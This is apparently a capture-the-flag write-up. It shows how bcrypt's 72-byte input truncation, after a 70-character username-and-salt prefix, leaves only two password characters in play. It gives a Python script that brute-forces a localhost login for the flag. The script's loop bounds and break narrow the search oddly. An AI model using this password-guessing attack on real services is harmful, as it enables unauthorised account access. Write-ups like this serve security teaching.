1. Looking at the source code, it is revealed that the hash is generated with these three components:
- username, `admin` (length of 5)
- random string, `an_additional_random_string_to_leengthen_the_hash_for_some_reason` (length of 65)
- and password (variable length)

2. Furthermore, the hash uses the BCRYPT algorithm. On the official [PHP Documentation](https://www.php.net/manual/en/function.password-hash.php), we see that the BCRYPT algorithm truncates its input when generating the hash
    > Caution Using the PASSWORD_BCRYPT as the algorithm, will result in the password parameter being truncated to a maximum length of 72 bytes.
    Since the first 2 components of the input 70 chars, only the first 2 characters of the entered password will be considered. This means that bruteforce is possible.

3. Solve script is as provided:
```python
import requests

target = "http://localhost:9999/?username={}&password={}"

for i in range(33, 127):
    for j in range(75, 127):
        guess = chr(i) + chr(j)
        print(f"[+] Trying {guess}")

        url = target.format("admin", guess)

        response = requests.get(url)

        if "grifflesCTF{" in response.text:
            print(f"[+] Found flag in response:")
            print(response.text)
            break
    break
```